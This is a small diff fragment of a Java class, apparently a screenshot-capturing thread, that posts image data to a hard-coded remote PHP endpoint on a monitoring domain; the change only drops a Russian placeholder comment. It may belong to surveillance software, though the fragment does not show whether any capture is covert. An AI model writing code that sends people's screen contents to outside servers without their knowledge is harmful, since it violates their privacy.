@@ -61,7 +61,7 @@ public class Screenshots extends Thread {
 
     private void sendPostRequest(byte[] imageData, int myVariable) {
         try {
-            String phpScriptUrl = "http://monitor.incomecorp.ru/post_screenshots.php"; // Замените на реальный URL вашего PHP скрипта
+            String phpScriptUrl = "http://monitor.incomecorp.ru/post_screenshots.php";
             HttpClient httpClient = HttpClients.createDefault();
             HttpPost httpPost = new HttpPost(phpScriptUrl);
 
